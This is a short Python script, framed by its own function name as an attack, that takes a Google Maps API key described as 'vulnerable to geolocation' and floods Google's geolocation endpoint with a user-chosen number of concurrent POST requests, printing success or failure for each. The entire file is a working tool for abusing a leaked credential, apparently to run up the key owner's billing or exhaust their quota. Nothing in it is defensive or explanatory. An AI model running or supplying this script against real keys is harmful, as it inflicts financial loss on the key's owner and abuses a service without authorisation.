#!/usr/bin/python3
import grequests, warnings, json, sys, os, random, colorama, calendar, time
from colorama import Fore
colorama.init(autoreset=True)

def exception_handler(request, exception):
    print(Fore.RED + "Request Failed")

def generate_url(apikey):
    return f"https://www.googleapis.com/geolocation/v1/geolocate?key={apikey}"

def do_attack():
    apikey = str(input("Enter Google Maps API Key that vulnerable to geolocation: "))
    count = int(input("Enter packet count: "))
    print (Fore.GREEN + "[+] Sending Packets")
    urls = list()
    for i in range(count):
        url = generate_url(apikey)
        urls.append(url)

    data = {"considerIp": "true"}
    responses = (grequests.post(u, data=data, timeout=5) for u in urls)
    result_map = grequests.imap(responses, exception_handler=exception_handler, size=100)
    for result in result_map:
        if result is not None:
            if result.text.find("error") < 0:
                print(Fore.GREEN + f"[+] Packet Succeed: No Error Message")
            else:
                print(Fore.RED + f"[-] Packet Failed: Error Message Exist")
        else:
            print("[-] Packet Failed: Request Failed")

if __name__ == "__main__":
    do_attack()

